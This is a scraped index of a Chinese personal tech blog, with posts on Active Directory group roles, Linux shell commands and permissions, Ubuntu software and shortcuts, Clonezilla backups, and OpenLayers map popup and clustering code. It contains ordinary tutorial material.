然后为域本地组分配资源权限。按照AGDLP的原则对用户组织和管理起来更容易 在AGDLP形成以当给一个用户某个权限的时候，只要把这个用户家到某一个本地域组就可以了。 全局组、通用组的权限 域管理员组 Domain Admins 企业系统管理员组 Enterprise Admins 架构管理员组 Schema Admins 域用户组 Domain Users 本地组的权限： Administrators (管理员组) Remote Desktop USer （远程登录组） Print Operator (打印机操作员组) Account Operators （账号操作员组） Server Operater （服务器操作员组） Backup Operators (备份操作员组 ) 域环境搭建 Windows 2012 R2 设置IP 更改计算机名 安装域控制器和DNS服务 升级服务器 创建Active Directory用户 Windows7 Windwos7 通过防火墙Monowall构建二级内网 防火墙Monowall的使用 开源，基于软件的防火墙， 基于Web页面管理的 中文版： www.cat-home.org/?action=show\u0026id=158 网络适配器: 2个， 一个NAT，一个桥接，硬盘要求特别低； 配置： ","date":"2020-01-07","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:8:0","tags":["渗透测试","内网"],"title":"内网第一章 - 内网基础知识","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"基本Shell常识 ctrl + D # 结束当前输入 ctrl + c # 强制结束一切 # bash ls 参数: -l -a -d 只显示目录自身信息 -i 显示inode信息 -S 按文件大小排序 -r 倒序 -t 按修改时间排序 -h 文件大小便于人类阅读方式 cp cp file1 file2 cp file1 f2 dir/ 参数: -R/r 拷贝目录 -l 硬链接拷贝(ls -li) # node的值是相同的,对应的硬盘数据块是相同的,只是多了一个指向 -s 软连接拷贝 (ls -li查看时候第一个字母是'l') #inode值相同, 只是指向了真实的文件,快捷方式 -S 目标名称添加后缀 `cp -S -bak b b1` # 把b拷贝为b1的时候,目标文件b1加上后缀-bak -u 源比目标新时才拷贝 `cp -u aa /home/a` # 保存更加新的文件 mv 参数: mv f1 f2 mv f1 f2 dir/ -f # 强制移动 touch 参数: - 如果文件名存在,修改文件mtime, 但不修改内容 rm 参数: -i # 每删除之前提醒 -d # 删除空目录 rm -rf echo 将命令参数显示在stdout 参数: -n # 显示结束不换行 -e # 解释反斜线转义符 `echo \\\"n\"` `echo -ne 123\\\\b` echo -e a\\\\n 目录结构 目录 \u003e 分区 /bin/ /boot/ /dev/ /etc/ /home/ /lib/ /media/ /mnt/ /opt/ /sbin/ /srv/ /temp/ /usr/ /var/ /root/ /proc/ mkdir 参数: -p # 按需创建父目录 pwd 参数: -P # 物理路径(软连接对应的真实路径) -L # 逻辑路径(软连接自身路径) rmdir 参数: -p # 递归删除 通配符: grep sudo grep root /etc/* 参数: -i # 忽略大小写 -v # 反相匹配 -n # 显示行号 -r # 递归目录和子目录中所有文件 -c # 显示目标文件中包含关键字的行数 -f 1.txt 2.txt # 1.txt中多个关键字同时匹配 -E '1|2|3' a.txt # 或者1或者2或者3 grep a[123] a.txt a1,a2,a3 less more的增强版 参数: 快捷键: z/b # 向前/后翻页 v # 进入编辑模式 g/G # 直接跳过第一行/最后一行(或第n行) /word # 向前搜索关键词 ?word # 向后搜索关键词 n/N # 正向/反向继续搜索关键字 q # 退出 grep xxx/words | less nano 参数: head / tail 显示文件头/尾部内容, 默认10行 参数: -n # 指定显示的行数 比如: -3 -f # 实时显示 tail -f a.txt # tailf 命令 diff 参数: -u # 统一格式输出 -y # 并排输出比较 # | \"不同\", ; 配合-w参数限制宽度 -w # 忽略空格 -i # 忽略大小写 file 检测文件格式 顺序执行三种测试集: filesystem 匹配系统头文件\u003csys/stat.h\u003e magic , -l 查看 language, 匹配文件起始位置的字符类型 一种测试匹配即停止检测,全都不匹配返回data 参数: -f # 文件列表 -ib # mime类型 find 参数: -name -type # b c d f l -user -mtime +1 -mtime -20 关于时间的概念: atime, ctime amin, nmin, cmin -cnewer file # 比这个文件更加新的文件 find / -mtime 1 # 昨天到前天,发生修改的文件 find / -mtime +1 # 昨天之前所有修改的,,, find / -mtime -1 # 昨天到now,发生修改的文件 stat 查看文件详细信息 参数: locate 基于文件索引进行搜索 不验证文件是否存在,速度快但结果不准确 updatedb更新索引 参数: sort sort a.txt 参数: -r # 反向排序 -n # 按照数值大小排序 -M # 按照月份排序 # 另一个排序的命令 ls -l --sort=key size time extension 只有先排序,才能取唯一值 ​ ","date":"2020-01-01","objectID":"/ubuntu-server-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:0:0","tags":["Linux","ubuntu"],"title":"Ubuntu server-基础命令","uri":"/ubuntu-server-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"基础软件包 sudo apt intall flashplugin-intaller # 安装浏览器flash插件 sudo apt install meld # 对两个目录/文件 一一比对 sudo apt install amule # 电驴 sudo apt install transmission # BT下载工具 （还可以） sudo apt install qbittorrent # BT下载工具 sudo apt install ttf-wqy-microhei # 字体文件 sudo apt install mtr # 网络路径追踪工具（基于图形化） sudo apt install whois sudo apt install git sudo apt install curl # 命令行完成对浏览器访问的基本操作（写脚本常用） sudo apt install obs-studio # 录屏 （图标是旋风形状的，也可以直播） sudo apt install ubuntu-restricted-extras # 一组视频的解码器 sudo apt install libavcode-extra libdvd-pkg # 使得linux可以比方dvd的介质。配合上面那个 sudo apt install unrar unrar-free # 解压rar文件 sudo apt install woeusb # 将iso文件刻录到u盘上面 sudo apt install ascii # 运行命令查看常用的ascii编码 sudo apt install unicode # unicode 你好， 转换为对应uniode编码 sudo apt install axel # 基于字符界面的下载工具（比wget与curl强大） # 支持断点续传等等 ","date":"2019-12-29","objectID":"/ubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6/:0:1","tags":["linux"],"title":"ubuntu推荐生产力软件","uri":"/ubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6/"},{"categories":["Linux"],"content":"安装java sudo add-apt-repository ppa:webupd8team/java sudo apt-get update sudo apt-get install oracle-java8-installer oracle-java8-set-default source /etc/profile # 将oracle的java设为默认环境，替换open java ","date":"2019-12-29","objectID":"/ubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6/:0:2","tags":["linux"],"title":"ubuntu推荐生产力软件","uri":"/ubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6/"},{"categories":["Linux"],"content":"中文输入法 sudo apt install ibus ibus-pinyin imconfig # 运行，安装向导，选择ibus reboot 设置，将只能中文输入法加入（或者supingyin） # ibus有个小bug，手动修复： ibus-setup 然后取消上面的勾选 ","date":"2019-12-29","objectID":"/ubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6/:0:3","tags":["linux"],"title":"ubuntu推荐生产力软件","uri":"/ubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6/"},{"categories":["Linux"],"content":"常用软件 chrome Golddict （中英文翻译） 邮件客户端 mailspring # UI美观，但是性能不是很好 thunderbird # 性能好，太丑 Protonmail Desktop # 最安全的邮件（质子形状的） 推荐安全从业者 Office WPS for Linux # 唯一推荐 onlyoffice # 客户端不成熟，可以集成到云上， to-do-list （列表清单软件） zenkit # 打开ubuntu的软件仓库，可以直接搜索安装 ， 也可以做为看板类型软件 印象笔记 Tusk # 软件仓库搜索安装即可，可以同步印象笔记 书籍管理 calibre 虚拟机 virtualBox / VMWare Workstation 下载工具 uGet # 类似图形化的axel，支持断点续传 aMule Transmission 图形图像视频编辑 GIMP # 开源软件中的ps VLC kenlive # 视频编辑 pitivi # 视频编辑 思维导图 MindMaster # 国产 appimage 程序下载 打包软件方式，大大降低了软件安装的成本（类似于绿色软件方式），建议多逛逛 https://appimage.github.io ","date":"2019-12-29","objectID":"/ubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6/:0:4","tags":["linux"],"title":"ubuntu推荐生产力软件","uri":"/ubuntu%E6%8E%A8%E8%8D%90%E7%94%9F%E4%BA%A7%E5%8A%9B%E8%BD%AF%E4%BB%B6/"},{"categories":["Linux"],"content":"快捷键 ctrl + alt + up/down 快速切换linux虚拟桌面 Win + a shift/alt + PrintScreen **shift:**截图（光标变成十字，手动框选） alt: 截取当前窗口 Win + up/down/left/right 将当前应用窗口移动贴到桌面的左右， 下：回到原位置，上：放到最大 ctrl + alt + t 打开终端 再ctrl +shift + n: 新建一个终端 ctrl + d 关闭当前终端窗口 ctrl + shift + t 以tab方式打开新终端 ctrl + shift + c/v 终端里面的复制粘贴 win + d 快速返回显示桌面 ctrl + w/q + w: 关闭一个浏览器/某些应用的页签 + q：关闭所有浏览器/某些应用页签 ctrl + h 将当前应用窗口最小化 win + L 锁定用户对话（锁屏） win + m 打开日历 alt + win + 8 所有内容变为一倍（授课可以用），再按就回去了 win + shift + pageUP/pagedown 将当前应用窗口移动到上一个/下一个虚拟桌面 alt + tab 切换程序窗口 ctrl + t 新建标签页 CTRL + L 跳到地址栏 CTRL + K 跳到搜索引擎输入框 CTRL + D 收藏到书签 Alt + F4 关闭当前窗口 常见终端快捷键 Ctrl + Alt + T：打开终端 Tab：命令或文件名自动补全 Ctrl + Shift + C：复制 Ctrl + Shift + V：粘贴 Ctrl + Shift + T：在同一个窗口新建终端标签页 Ctrl + Shift + W：关闭标签页 Ctrl + Shift + N：新建终端窗口 Ctrl + Shift + Q：关闭终端窗口 Ctrl + Shift + PageUp：标签页左移 Ctrl + Shift + PageDown：标签页右移 Ctrl + D：关闭标签页 Ctrl + L：清除屏幕 Ctrl + C：终止当前任务 Ctrl + P：显示上一条历史命令 Ctrl + N：显示下一条历史命令 Ctrl + R：反向搜索历史命令 Ctrl + J/M：回车（同enter键功能） Ctrl + A：光标移动到行首 Ctrl + E：光标移动到行尾 Ctrl + B：关闭想后移动一个位置（backward） Ctrl + Z：把当前任务放到后台运行 Ctrl + PageUp：前一个终端标签页 Ctrl + PageDown：下一个终端标签页 F1：打开帮助指南 F11：全屏切换 Alt + F：打开“文件”菜单（file） Alt + E：打开“编辑”菜单（edit） Alt + V：打开“查看“菜单（view） Alt + S：打开“搜索”菜单（search） Alt + T：打开“终端”菜单（terminal） Alt + H：打开“帮助”菜单（help） Ctrl + →：光标移动到上一个单词的词首 Ctrl + ←：光标移动到下一个单词的词尾 Ctrl + T：将光标位置的字符和前一个字符进行位置交换 Ctrl + U：剪切从行的开头到光标前一个位置的所有字符 Ctrl + K：剪切从光标位置到行末的所有字符 Ctrl + Y：粘贴Ctrl + U/Ctrl + K剪切的内容 Ctrl + H/*：删除光标位置的前一个字符（backspace键功能） Ctrl + D：删除光标位置的一个字符（delete键功能） Ctrl + W：删除光标位置的前一个单词（Alt + Backspace组合键功能） Ctrl + \u0026：恢复Ctrl + H/D/W删除的内容 Ctrl + Win + ↑：最大化当前窗口 Ctrl + Win + ↓：还原/最小化当前窗口 Ctrl + Win + D：最小化所有窗口 Win + W：展示所有窗口 Win + T：打开回收站 2次连续Tab/4次连续Esc/2次连续Ctrl + I：将显示所有命令和工具名称 ctrl-B # 左 ctrl-F # 右 ctrl-P # 上 ctrl-N # 下 ctrl-A # 光标到行首 ctrl-E # 光标到行尾 ctrl-W # 删除光标前以空格分隔段落 ctrl-U # 删除光标到行首 ctrl-K # 删除光标到行首 ctrl-Y # 粘贴删除的内容 ","date":"2019-12-29","objectID":"/ubuntu%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/:0:0","tags":["linux"],"title":"ubuntu常用快捷键","uri":"/ubuntu%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"categories":["Linux"],"content":"系统备份 ","date":"2019-12-29","objectID":"/linux%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD/:1:0","tags":["linux","Ubuntu","系统备份"],"title":"linux系统备份","uri":"/linux%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD/"},{"categories":["Linux"],"content":"怎么备份 常见的备份工具 0.Ghost 1. DIsks (ubuntu系统查找： disks, 缺点:过程中不能压缩空间，原来多少现在备份文件就是多少) 备份： 选择硬盘右上角“create disk image”, 选择存储目录, 点击\"start…\" 还原： 选择硬盘右上角“restore disk image”， 选择备份好的硬盘文件，“start” 2. Clonezilla (备份过程中实现镜像) 源自台湾政府安全部门的开源项目 支持网络以及外置存储设备 服务器客户端部署 https://clonezilla.org 适合大批量的… ","date":"2019-12-29","objectID":"/linux%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD/:1:1","tags":["linux","Ubuntu","系统备份"],"title":"linux系统备份","uri":"/linux%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD/"},{"categories":["Linux"],"content":"下面是clonezilla的 实例： 1. Clonezilla 的备份 下载 主要是两个版本，两个稳定版本和下面两个测试版本： Live release Extra info Other notes alternative stable - 20191024-eoan checksums, checksums gpg,changelog, known issue, release note Ubuntu-based, ? stable - 2.6.4-10 checksums, checksums gpg changelog, known issue, release note Debian-based, ? alternative testing - 20191226-eoan 20191226-focal checksums, checksums gpg, changelog, known issue checksums, checksums gpg, changelog, known issue Ubuntu-based, ? testing - 2.6.5-8 checksums, checksums gpg, changelog, known issue Debian-based, ? case1. 只有一个硬盘： （对分区做备份） 1.建议对硬盘分区，一个小的只安装系统啥啥，另一个分区存放资料与分区。备份一个分区 2.备到外置存储设备 case2. 不止一块硬盘 (这个) 对那个系统整个硬盘做备份 下面是对新虚拟机的实验环境： （自己的机器不用做这一步） 使用disk 对新硬盘格式化：点击硬盘format disk 分区：create Partition 可以直接选择最大的分区 给个卷标： 比如bak 挂载： 点击 “播放”形状的按钮 下面开始 准备备份 1.选择使用这个clonezilla 的iso来引导打开操作系统 2.然后在界面选live就行， 第二个选项other mode 可以选择分辨率 3.语言、键盘等自己选择 4.选择克隆类型： ​ 设备对设备，硬盘对硬盘,… ​ 这里（对本机）就选设备到image (如果是还原的过程，就选image-到device) 5.选择image存放位置(有本地和云或者ssh服务器)，这里选local device 6.回车，开始识别本地设备，设备识别完成后，再按ctrl + c 7.选择第二个硬盘(即目标位置)来存放image文件， 按住tab选择 done, 继续回车 8.接下来，建议选择第一个选项：Beginner mode , 即初学者（接下来的操作会有信息提示） 9.接下来，选择save disk（保存硬盘） / save part（保存分区） ， 然后选择保存的名称 10.选择备份源： tab来选择第一个硬盘（即需要备份的系统盘） 11.下一步，选择备份过程是否进行检查，*推荐不检查 ** （即-sfsk） 下一步，是否再对生成的影像文件 进行检查 yes/no , 一般不用检查， tab选择no 13.选择 加密(enc)/不加密（senc）, 即是否在还原的时候需要输入密码 14.接下来，选择备份之后是关机(poweroff)还是重启(reboot)？ 按回车进行下一步，确认无误后按住yes 15…….开始备份…… （时间大概10分钟之内） 16….备份完自动重启，挂载上硬盘，就会看到那个备份映像的文件夹 2. Clonezilla 的还原 插入光盘到光驱，即clonezila的iso文件 使用Clonezilla引导，选择live，（同上） start clonezilla 扔选择device -\u003e image 选择Local device 他自动识别硬盘， ctrl+c结束识别 接下来自己选择磁盘映像的硬盘的分区，选择映像文件所在的文件夹，选择done 选择 beginer mode 选择 restoredisk 选项： 选择ok 选择sda（即还原到哪） 是否检查选项， 欢迎之后选择是否关机/重启 回车 回车 确认无误后输入yes回车 ……开始恢复…… ","date":"2019-12-29","objectID":"/linux%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD/:1:2","tags":["linux","Ubuntu","系统备份"],"title":"linux系统备份","uri":"/linux%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD/"},{"categories":null,"content":"GIS硕士在读，方向是深度学习与遥感图像处理，同时也是一名安全爱好者，努力做一名合格的白帽子。 很久之前想拥有一个自己的博客来记录自己所有的东西，现在终如愿以偿。可是当博客搭建完成之后，就发现自己有点懒，懒到都懒得写博客哈哈哈。希望我能坚持下去，从\"流水账\"文章（大佬勿喷）一点一定地升华从而提高自我（过程也许会有点漫长）。 ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"关于 我","uri":"/about/"},{"categories":["GIS"],"content":"点击【地图查看】，弹出地图，并缩放到当前某一xx的范围 效果大致是这样(图没了)： 先把弹窗的页面元素写出来 \u003c!--弹出层时背景层DIV--\u003e \u003cdiv id=\"fade\" class=\"black_overlay\"\u003e \u003c/div\u003e \u003c!-- 主体部分 --\u003e \u003cdiv id=\"MyDiv\" class=\"white_content\"\u003e \u003cdiv style=\"text-align: left; cursor: pointer; height: 40px; display:inline-block; float:left\"\u003e \u003cspan style=\"font-size: 16px; font-weight:bold; line-height:40px;\" id=\"dtval\"\u003e\u003c/span\u003e \u003c/div\u003e \u003cdiv style=\"float:right; text-align: right; cursor: pointer; height: 40px; display:inline-block\"\u003e \u003cbutton type=\"button\" class=\"close\" style=\"font-size: 30px;font-weight: bold; background: none;border: none;outline: none;position: relative;right:6px;top:4px \" onclick=\"CloseDiv('MyDiv','fade')\" title=\"关闭详情\"\u003e×\u003c/button\u003e \u003c/div\u003e \u003ciframe frameborder=\"0\" id=\"iframepagemap\" name=\"iframepage\" scrolling=\"no\" style=\"width: 100%;height: 100%;\" src=\"\"\u003e\u003c/iframe\u003e \u003c/div\u003e 绑定按钮的点击事件 \u003cbutton type=\"button\" class=\"btn btn-primary bottomBtn catMapBtn\" onclick=\"ShowDiv('MyDiv','fade')\"\u003e地图查看\u003c/button\u003e //两个参数 分别是弹出主体和遮罩背景 的id js文件中： 弹窗方法 var initmap = false; //弹出隐藏层 function ShowDiv(show_div,bg_div){ document.getElementById(show_div).style.display='block'; document.getElementById(bg_div).style.display='block' ; var bgdiv = document.getElementById(bg_div); bgdiv.style.width = document.body.scrollWidth; // bgdiv.style.height = $(document).height(); $(\"#\"+bg_div).height($(document).height()); var iframe = document.getElementById(\"iframepagemap\"); if(!initmap){ $(\"#iframepagemap\").attr(\"src\",\"../map/map.jsp\"); var i = 0; var finishmap = setInterval(function () { if (iframe.contentWindow.map!=null){ map = iframe.contentWindow.map; initM= iframe.contentWindow.initM; OpenLayers = iframe.contentWindow.OpenLayers; LayerSwitcherExt = iframe.contentWindow.LayerSwitcherExt; clearInterval(finishmap); initmap = true; // 项目范围ajax LonatDetail(xmNameStr); }else{ i++; } },100) }else{ // 项目范围ajax LonatDetail(xmNameStr); } }; 获取项目区域的ajax function LonatDetail(xmNameStr){ $.ajax({ url:baseurl + \"Program.action\", type:\"POST\", data:{ method:\"progremLonat\", paramts:xmNameStr, }, dataType: \"json\", success: function(data){ addPolygon(data[0]['LONLAT']); }, error: function(msg){ alert(\"ajax Error!\"); } }) } // 从后台拿到的data为： /* 0: {LONLAT: \"[{\"x\":100.12341032715,\"y\":30.675432620386},{\"x\":12…96102,\"y\":55.555}]\"} */ 地图范围的缩放与绘制面 // 弹出地图缩放至 function addPolygon(data){ data2 = eval(\"(\"+data+\")\"); //解析json字符串为json对象 var paths = []; // 存储坐标 for (var a = 0; a \u003c data2.length; a++) { var pf = new OpenLayers.Geometry.Point( data2[a][\"x\"], data2[a][\"y\"]); // 点的数组 paths.push(pf); } var stylePolyline = { //画面的样式 strokeWidth : 2, strokeOpacity : 0.8, strokeColor : \"blue\", fillColor : \"white\", fillOpacity : 0.5 }; // 点组织成线 var line = new OpenLayers.Geometry.LinearRing(paths); // 由线组织成面 var polygon = new OpenLayers.Geometry.Polygon(line); var featureLine = new OpenLayers.Feature.Vector(); featureLine.geometry = polygon; featureLine.style = stylePolyline; map.setLayerIndex(map.getLayer(\"drawLayer\"), map.layers.length - 1); map.getLayer(\"drawLayer\").removeAllFeatures(); map.getLayer(\"drawLayer\").addFeatures(featureLine); lonlat = featureLine.geometry.getBounds().getCenterLonLat(); var zoom = map.getZoomForExtent(featureLine.geometry.getBounds()) - 1; if(zoom == 20){ zoom = 19; } map.setCenter(lonlat,zoom); //缩放到lonlat, zoom是范围大小 }; 关闭弹窗的方法 //关闭弹出层 function CloseDiv(show_div,bg_div) { document.getElementById(show_div).style.display='none'; document.getElementById(bg_div).style.display='none'; }; ","date":"2019-05-09","objectID":"/%E5%9C%B0%E5%9B%BE%E7%BC%A9%E6%94%BE%E5%88%B0%E6%8C%87%E5%AE%9A%E7%BB%8F%E7%BA%AC%E5%BA%A6/:0:1","tags":["webgis","GIS"],"title":"弹出地图并缩放到指定经纬度","uri":"/%E5%9C%B0%E5%9B%BE%E7%BC%A9%E6%94%BE%E5%88%B0%E6%8C%87%E5%AE%9A%E7%BB%8F%E7%BA%AC%E5%BA%A6/"},{"categories":["GIS"],"content":"折腾了好久，终于把地图聚合给做出来了，这还得感谢杨姐姐最终的指点（不对，是帮助了很多）。下面我就直接贴代码了。 代码的主目录是这样的： cluster.html \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eOpenLayers Control/SelectCluster\u003c/title\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /\u003e \u003clink rel=\"stylesheet\" href=\"style.css\" /\u003e \u003cscript type=\"text/javascript\" src=\"OpenLayers.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"Cluster.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\" src=\"SelectCluster.js\"\u003e\u003c/script\u003e \u003cscript type=\"text/javascript\"\u003e var map, clayer, ctrl; function initMap() // 初始化地图，可以拿来放到自己对应的位置 { // Nouvelle carte map = new OpenLayers.Map(\"map\"); // OSM map.addLayer ( new OpenLayers.Layer.OSM() ); // Ajouter un controle pour les couches map.addControl(new OpenLayers.Control.LayerSwitcher()); // Centrer la carte var WGS84 = new OpenLayers.Projection('EPSG:4326'); map.setCenter(new OpenLayers.LonLat(2.424, 48.845).transform(WGS84, map.getProjectionObject()), 13); // Cluster layer's style var style = new OpenLayers.Style ({ pointRadius: 12, externalGraphic: \"img/pins.png\", backgroundGraphic: \"img/pinsback.png\", graphicYOffset:-24, backgroundXOffset: 0, backgroundYOffset: -16, graphicZIndex: 11, backgroundGraphicZIndex: 10, fillColor: \"${fcolor}\", //\"#F0C20C\", fillOpacity: 1, strokeColor: \"#333\", strokeWidth: 2, strokeOpacity: 1, labelSelect: false, //label: \"${label}\", //labelYOffset: \"${labelOffset}\", fontFamily: '\"Luxi sans\",\"Lucida Grande\",Lucida,\"Lucida Sans Unicode\",sans-serif', fontSize: \"${fSize}\", fontWeight : \"bold\", cursor:\"pointer\" }, { context: { label: function(f) { if (f.cluster) return f.cluster.length ? f.cluster[0].attributes.n : \"\"; return f.attributes.n; }, labelOffset: function(f) { return (f.cluster \u0026\u0026 f.cluster.length\u003e1) ? \"\" : -8; }, fSize: function(f) { return (f.cluster \u0026\u0026 f.cluster.length\u003e1) ? 12 : 8; }, fcolor: function(f) { if (!f.cluster) return \"#F0C20C\"; if (f.cluster.length\u003c8) return \"#AF7\"; if (f.cluster.length\u003c16) return \"#FD5\"; return \"#F97\"; } } }); // New cluster Layer clayer = new OpenLayers.Layer.Cluster (\"Clusters\", { rendererOptions: {yOrdering: true}, styleMap: new OpenLayers.StyleMap ({ \"default\": style, \"select\": { pointRadius: 18 } }) }); // Add 200 features to cluster var b = map.calculateBounds(); var features = new Array(); for (var i = 0; i \u003c 200; i++) // 测试数据，替换为自己拿到的xy坐标 { var r1 = Math.random(); var r2 = Math.random(); var px = b.left + (b.right-b.left) *r1 ; var py = b.bottom + (b.top-b.bottom) *r2 ; var f = new OpenLayers.Feature.Vector( new OpenLayers.Geometry.Point(px, py), {n:i} ); features.push(f); } map.addLayer(clayer); clayer.addFeatures(features); // Select control ctrl = new OpenLayers.Control.SelectCluster (clayer, { hover:false, pointRadius:12, animate:true, connect:false, onSelect: function(feature) { if (feature.cluster) feature = feature.cluster[0]; showStatus(\"selected feature \"+feature.attributes.n+\" (\"+feature.id+\")\"); }, onUnselect: function(feature) { showStatus(\"\"); }, }); map.addControl (ctrl); ctrl.activate(); } function showStatus(text) { document.getElementById(\"status\").innerHTML = text; } \u003c/script\u003e \u003cstyle\u003e body { font:1em Helvetica,Arial,sans-serif; } h1 { color:#369; margin:0.5em 0 0.2em } #tags { color:#69F; font-size:0.9em; } p { margin: 0.5em 0; } p.title { color:#369; font-weight:bold; } #map { background:#fff; float:left; } #options { margin:0.5em; float:left; } #options p { margin:0 0 1em; } #docs { background:#e3e6e9; padding:0.5em; margin:0.5em 0; } .olControlAttribution { bottom:0; background:rgba(255,255,255,0.6); padding: 0 0.5em; } #status { display:block; clear:both; } \u003c/style\u003e \u003c/head\u003e \u003cbody onload=\"initMap()\"\u003e \u003c!-- DIV pour la carte --\u003e \u003cdiv id=\"map\" style=\"width:600px; height:400px;\"\u003e\u003c/div\u003e \u003cp id=\"status\"\u003e \u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 但是由于业务需求，需要再改动一下 添加：点击地图要素，弹出其信息，点击其他区域，上一个弹窗消失： function loadJuhe(){ // Cluster layer's style var style = new OpenLayers.Style ({ pointRadius: 12, externalGraphic: \"../../../otherlibs/ol2/img/pins.png\", // 要素图标，我贴在后面，也可以用自己的 backgroundGraphic: \"../../../otherli","date":"2019-05-09","objectID":"/ol2%E5%AE%9E%E7%8E%B0%E5%9C%B0%E5%9B%BE%E6%95%88%E6%9E%9C/:0:0","tags":["openlayer","GIS"],"title":"ol2实现地图聚合功能","uri":"/ol2%E5%AE%9E%E7%8E%B0%E5%9C%B0%E5%9B%BE%E6%95%88%E6%9E%9C/"},{"categories":["Linux"],"content":"用户身份与文件权限 用户 1.管理员 root UID: 0 2. 系统用户 5/6 UID: 1-499 红帽7 UID 1-999 /sbin/nologin 3.普通用户 5/6 500-65535 7 1000- id xps # 查看用户信息 useradd useradd -u 555 xps # 新建用户并指定uid useradd -u ssbin/nologin xps # 指定终端 adduser groupadd hhh # 新建用户组 usermod -G hhh xps # 基本组/扩展组 usermod -u 666 xps # 修改uid groupdel hhh # 删除用户组 passwd xps # 重置密码 userdel xps # 删除用户(不删除home等) userdel -r xps # 删除用户(信息全删除） deluser #修改name的话可以直接去 /etc/passwd修改 文件权限 文件类型 ➢ -：普通文件。 ➢ d：目录文件。 ➢ l：链接文件。 ➢ b：块设备文件。 ➢ c：字符设备文件。 ➢ p：管道文件。 r读4 w写2 x执行1 =============== chmod # 权限 格式为“chown [参数] 所有者:所属组 文件或目录名称” chown root:bin test chown # 所有者，属性 -Rf # 强制的意思 chmod -Rf 777 test/ chmod -Rf g+s test/ # 并为该目录设置了 SGID 特殊权限位 chmod -R o+t linux/ # 设置sbit权限 保护位 文件的特殊权限 1.**SUID** # 让程序执行者，临时获取程序所有者的身份（仅对拥有执行权限的二进制程序有效） u+s 4 2.**SGID** # 让程序执行者，临时获取程序所有组的身份 让目录内的新建文件，集成目录所有组的名称 g+s 2 3.**SBIT** #让目录内的文件，**只能自己删除自己**的 RHEL 7 系统中的/tmp 作为一个共享文件的目录，默认已经设置了 SBIT 特殊权限位，因此除非是该目录的所有者，否则无法删除这里面的文件； 当目录被设置 SBIT 特殊权限位后，文件的其他人权限部分的 x 执行权限就会被替换成 t 或者 T，原本有 x 执行权限则会写成 t，原本没有 x 执行权限则会被写成 T o+t 1 suid: x 改变成 s 就意味着该文件被赋予了 SUID 权限。如果原本的权限是 rw-呢？如果原先权 限位上没有 x 执行权限，那么被赋予特殊权限后将变成大写的 S s 证明原先有x S 证明原先没有x sgid: s 证明原先有x S 证明原先没有x sbit: 对其他目录来设置 SBIT 特殊权限位，用 chmod 命令就可以了。对应的参数 o+t 代表设置 SBIT 粘滞位权限： t 证明原先有 T 证明原先没有x 例如： 转换7654 # 7是特殊权限位， 654是一一般权限位 420 401 400 rw- r-x r-- 7: = 4+2+1 三个都涉及了,所以要都加上 # S-\u003e之前没有x权限，s-\u003e之前有x权限,T-\u003e之前没有... rwSrwsr-T ====== rwsr--rwT rwxr--rw- 746 s=4,T=4 5746 ====== r-Srws--T 5470 文件的隐藏属性 1.chattr 设置文件的隐藏权限，格式为“chattr [参数] 文件” chattr +a /var/log/message 2. lsattr 显示文件的隐藏权限，格式为“lsattr [参数] 文件” lsattr -d Desktop/ $ 查看目录的... 表 5-6 chattr 命令中用于隐藏权限的参数及其作用 参数 含义 i 无法对文件进行修改；若对目录设置了该参数，则仅能修改其中的子文件内容而不能新建或删除文件 a 仅允许补充（追加）内容，无法覆盖/删除内容（Append Only） S 文件内容在变更后立即同步到硬盘（sync） s 彻底从硬盘中删除，不可恢复（用 0 填充原文件所在硬盘区域） A 不再修改这个文件或目录的最后访问时间（atime） b 不再修改文件或目录的存取时间 D 检查压缩文件中的错误 d 使用 dump 命令备份时忽略本文件/目录 c 默认将文件或目录进行压缩 u 当删除该文件后依然保留其在硬盘中的数据，方便日后恢复 t 让文件系统支持尾部合并（tail-merging） X 可以直接访问压缩文件中的内容 文件访问控制列表 ACL 对某个指定的用户进行单独的权限控制 如果针对某个目录设置了 ACL，则目录中的文件会继承其 ACL；若针对文件设置了 ACL，则文件不再继承其所在目录的 ACL 1.setfacl 命令 (针对目录文件需要使用-R 递归参数； 针对普通文件则使用-m 参数； 如果想要删除某个文件的 ACL，则可以使用-b 参数) setfacl -Rm u:xps:rwx /root # -m 修改 setfacl -Rm g:xpsg:r-x /tmp 看到文件的权限最后一个点（.）变成了加号（+） ,这就意味着该文件已经设置了 ACL 了。 2.getfacl su 